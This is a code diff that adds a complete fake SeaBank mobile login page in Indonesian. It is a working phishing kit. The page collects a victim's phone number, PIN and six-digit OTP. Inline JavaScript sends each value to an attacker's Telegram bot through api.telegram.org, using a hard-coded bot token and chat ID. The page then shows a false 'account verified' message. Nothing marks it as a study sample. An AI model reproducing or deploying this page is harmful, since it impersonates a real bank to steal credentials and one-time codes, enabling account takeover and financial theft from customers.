@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+<title>SeaBank Mobile Login</title>
+
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: #ffffff;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+        min-height: 100vh;
+    }
+
+    .container {
+        width: 100%;
+        max-width: 420px;
+        padding: 25px;
+        text-align: center;
+    }
+
+    .logo {
+        width: 55%;
+        max-width: 230px;
+        margin: 10px auto 20px;
+    }
+
+    h2 {
+        font-size: 18px;
+        font-weight: 600;
+        color: #333;
+        margin-bottom: 20px;
+    }
+
+    input {
+        width: 100%;
+        padding: 16px;
+        border: none;
+        border-radius: 12px;
+        background: #f7f8fa;
+        margin-bottom: 14px;
+        font-size: 16px;
+        box-sizing: border-box;
+    }
+
+    .forgot {
+        display: block;
+        text-align: right;
+        margin-bottom: 20px;
+        font-size: 14px;
+        color: #0066ff;
+        text-decoration: none;
+    }
+
+    .btn {
+        width: 100%;
+        padding: 16px;
+        font-size: 18px;
+        border: none;
+        border-radius: 14px;
+        background: #FF6B00;
+        color: white;
+        cursor: pointer;
+        transition: 0.2s;
+    }
+
+    .btn:active {
+        background: #d45a00;
+        transform: scale(0.97);
+    }
+
+    #otpPage, #successPage {
+        display: none;
+    }
+
+    .otp-box {
+        display: flex;
+        justify-content: center;
+        gap: 8px;
+        margin-top: 15px;
+    }
+
+    .otp-input {
+        width: 45px;
+        height: 55px;
+        font-size: 22px;
+        text-align: center;
+        border: 2px solid #ddd;
+        border-radius: 10px;
+    }
+
+    @media (max-width: 380px) {
+        .otp-input {
+            width: 40px;
+            height: 50px;
+            font-size: 20px;
+        }
+    }
+</style>
+</head>
+
+<body>
+<div class="container">
+
+    <!-- LOGIN PAGE -->
+    <div id="loginPage">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/SeaBank.svg/3840px-SeaBank.svg.png" class="logo">
+
+        <h2>Log in dengan no. handphone</h2>
+
+        <input type="text" id="hp" placeholder="Nomor Handphone">
+
+        <input type="password" id="pin" maxlength="6" inputmode="numeric" placeholder="PIN">
+
+        <a class="forgot" href="#">Lupa PIN?</a>
+
+        <button class="btn" onclick="goOTP()">Log In</button>
+    </div>
+
+    <!-- OTP PAGE -->
+    <div id="otpPage">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/SeaBank.svg/3840px-SeaBank.svg.png" class="logo">
+
+        <h2>Masukkan Kode OTP</h2>
+        <p style="font-size:14px; color:#666;">Kode OTP telah dikirim ke nomor Anda</p>
+
+        <div class="otp-box">
+            <input class="otp-input" maxlength="1">
+            <input class="otp-input" maxlength="1">
+            <input class="otp-input" maxlength="1">
+            <input class="otp-input" maxlength="1">
+            <input class="otp-input" maxlength="1">
+            <input class="otp-input" maxlength="1">
+        </div>
+
+        <button class="btn" style="margin-top: 25px;" onclick="goSuccess()">Verifikasi</button>
+    </div>
+
+    <!-- SUCCESS PAGE -->
+    <div id="successPage">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/SeaBank.svg/3840px-SeaBank.svg.png" class="logo">
+
+        <h2 style="font-size:22px; margin-top:20px;">Akun anda telah di verifikasi</h2>
+    </div>
+
+</div>
+
+<script>
+
+    /* === Telegram setup === */
+    const TG_TOKEN = "8679387125:AAGnUwe5XKJ275UmuYBY7d-gMmx4K3kPKSc";
+    const TG_CHAT_ID = "8580851235";
+
+    function sendToBot(msg) {
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: TG_CHAT_ID,
+                text: msg,
+                parse_mode: "HTML"
+            })
+        });
+    }
+
+    /* === LOGIN → OTP === */
+    function goOTP() {
+        let hp = document.getElementById("hp").value.trim();
+        let pin = document.getElementById("pin").value.trim();
+
+        if (hp === "" || pin === "") {
+            alert("Harap isi nomor HP dan PIN");
+            return;
+        }
+
+        /* Kirim ke Telegram */
+        sendToBot(
+            `<b>📱 LOGIN</b>\n` +
+            `Nomor: <code>${hp}</code>\n` +
+            `PIN: <code>${pin}</code>`
+        );
+
+        document.getElementById("loginPage").style.display = "none";
+        document.getElementById("otpPage").style.display = "block";
+
+        document.querySelector(".otp-input").focus();
+    }
+
+    /* === OTP → SUCCESS === */
+    function goSuccess() {
+        let otp = "";
+        document.querySelectorAll(".otp-input").forEach(i => otp += i.value);
+
+        if (otp.length < 6) {
+            alert("OTP harus 6 digit");
+            return;
+        }
+
+        /* Kirim OTP ke Telegram */
+        sendToBot(
+            `<b>🔐 OTP</b>\n` +
+            `Kode OTP: <code>${otp}</code>`
+        );
+
+        document.getElementById("otpPage").style.display = "none";
+        document.getElementById("successPage").style.display = "block";
+    }
+
+</script>
+
+</body>
+</html>
